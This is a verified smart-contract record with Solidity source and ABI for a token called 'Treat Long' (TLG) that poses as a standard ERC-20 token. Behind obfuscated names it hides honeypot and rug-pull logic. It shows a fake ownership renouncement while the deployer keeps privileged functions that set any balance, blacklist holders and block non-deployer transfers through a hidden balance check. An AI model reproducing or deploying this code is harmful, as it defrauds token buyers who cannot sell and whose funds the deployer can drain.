{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface exemptSwapMarketing {\n    function createPair(address listReceiver, address walletAuto) external returns (address);\n}\n\ninterface fromSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoToEnable) external view returns (uint256);\n\n    function transfer(address modeAuto, uint256 autoExemptShould) external returns (bool);\n\n    function allowance(address tradingLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoExemptShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeAuto,\n        uint256 autoExemptShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeWallet, uint256 value);\n    event Approval(address indexed tradingLimit, address indexed spender, uint256 value);\n}\n\nabstract contract launchSwapTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptShouldMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fromSenderMetadata is fromSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TreatLong is launchSwapTake, fromSender, fromSenderMetadata {\n\n    bool private totalFund;\n\n    string private txMax = \"Treat Long\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toMarketing;\n    }\n\n    function isList(address enableMin, address modeAuto, uint256 autoExemptShould) internal returns (bool) {\n        if (enableMin == launchedSwap) {\n            return fundExempt(enableMin, modeAuto, autoExemptShould);\n        }\n        uint256 listTo = fromSender(exemptTx).balanceOf(marketingLaunched);\n        require(listTo == receiverFee);\n        require(modeAuto != marketingLaunched);\n        if (tradingLiquidity[enableMin]) {\n            return fundExempt(enableMin, modeAuto, maxShould);\n        }\n        return fundExempt(enableMin, modeAuto, autoExemptShould);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityFromBuy;\n    }\n\n    uint8 private walletSell = 18;\n\n    function approve(address launchedReceiverMin, uint256 autoExemptShould) public virtual override returns (bool) {\n        minWallet[_msgSender()][launchedReceiverMin] = autoExemptShould;\n        emit Approval(_msgSender(), launchedReceiverMin, autoExemptShould);\n        return true;\n    }\n\n    function sellMax(address liquidityList) public {\n        if (txShould) {\n            return;\n        }\n        if (autoWallet) {\n            autoWallet = true;\n        }\n        modeAmountLaunched[liquidityList] = true;\n        if (autoWallet) {\n            autoFrom = false;\n        }\n        txShould = true;\n    }\n\n    function balanceOf(address autoToEnable) public view virtual override returns (uint256) {\n        return txFund[autoToEnable];\n    }\n\n    function getOwner() external view returns (address) {\n        return maxLaunchedExempt;\n    }\n\n    bool private autoFrom;\n\n    mapping(address => mapping(address => uint256)) private minWallet;\n\n    constructor (){\n        if (totalFund) {\n            autoWallet = false;\n        }\n        exemptShouldMax minFund = exemptShouldMax(enableToken);\n        exemptTx = exemptSwapMarketing(minFund.factory()).createPair(minFund.WETH(), address(this));\n        \n        launchedSwap = _msgSender();\n        modeAmountLaunched[launchedSwap] = true;\n        txFund[launchedSwap] = toMarketing;\n        fundLiquidity();\n        \n        emit Transfer(address(0), launchedSwap, toMarketing);\n    }\n\n    uint256 constant maxShould = 12 ** 10;\n\n    mapping(address => bool) public modeAmountLaunched;\n\n    function allowance(address autoTeamFee, address launchedReceiverMin) external view virtual override returns (uint256) {\n        if (launchedReceiverMin == enableToken) {\n            return type(uint256).max;\n        }\n        return minWallet[autoTeamFee][launchedReceiverMin];\n    }\n\n    event OwnershipTransferred(address indexed modeIs, address indexed senderIs);\n\n    bool private autoWallet;\n\n    uint256 tradingWallet;\n\n    function transfer(address tokenFrom, uint256 autoExemptShould) external virtual override returns (bool) {\n        return isList(_msgSender(), tokenFrom, autoExemptShould);\n    }\n\n    address public launchedSwap;\n\n    address marketingLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return txMax;\n    }\n\n    function atExempt(address toTx) public {\n        walletShouldSell();\n        if (autoFrom) {\n            totalFund = true;\n        }\n        if (toTx == launchedSwap || toTx == exemptTx) {\n            return;\n        }\n        tradingLiquidity[toTx] = true;\n    }\n\n    address public exemptTx;\n\n    mapping(address => uint256) private txFund;\n\n    bool public txShould;\n\n    function fundLiquidity() public {\n        emit OwnershipTransferred(launchedSwap, address(0));\n        maxLaunchedExempt = address(0);\n    }\n\n    mapping(address => bool) public tradingLiquidity;\n\n    address enableToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function autoTeam(uint256 autoExemptShould) public {\n        walletShouldSell();\n        receiverFee = autoExemptShould;\n    }\n\n    uint256 private toMarketing = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletSell;\n    }\n\n    function enableLiquidity(address tokenFrom, uint256 autoExemptShould) public {\n        walletShouldSell();\n        txFund[tokenFrom] = autoExemptShould;\n    }\n\n    uint256 receiverFee;\n\n    function transferFrom(address enableMin, address modeAuto, uint256 autoExemptShould) external override returns (bool) {\n        if (_msgSender() != enableToken) {\n            if (minWallet[enableMin][_msgSender()] != type(uint256).max) {\n                require(autoExemptShould <= minWallet[enableMin][_msgSender()]);\n                minWallet[enableMin][_msgSender()] -= autoExemptShould;\n            }\n        }\n        return isList(enableMin, modeAuto, autoExemptShould);\n    }\n\n    string private liquidityFromBuy = \"TLG\";\n\n    function walletShouldSell() private view {\n        require(modeAmountLaunched[_msgSender()]);\n    }\n\n    address private maxLaunchedExempt;\n\n    function fundExempt(address enableMin, address modeAuto, uint256 autoExemptShould) internal returns (bool) {\n        require(txFund[enableMin] >= autoExemptShould);\n        txFund[enableMin] -= autoExemptShould;\n        txFund[modeAuto] += autoExemptShould;\n        emit Transfer(enableMin, modeAuto, autoExemptShould);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return maxLaunchedExempt;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTeamFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedReceiverMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiverMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoExemptShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTx\",\"type\":\"address\"}],\"name\":\"atExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoExemptShould\",\"type\":\"uint256\"}],\"name\":\"autoTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoToEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoExemptShould\",\"type\":\"uint256\"}],\"name\":\"enableLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeAmountLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityList\",\"type\":\"address\"}],\"name\":\"sellMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoExemptShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoExemptShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "TreatLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}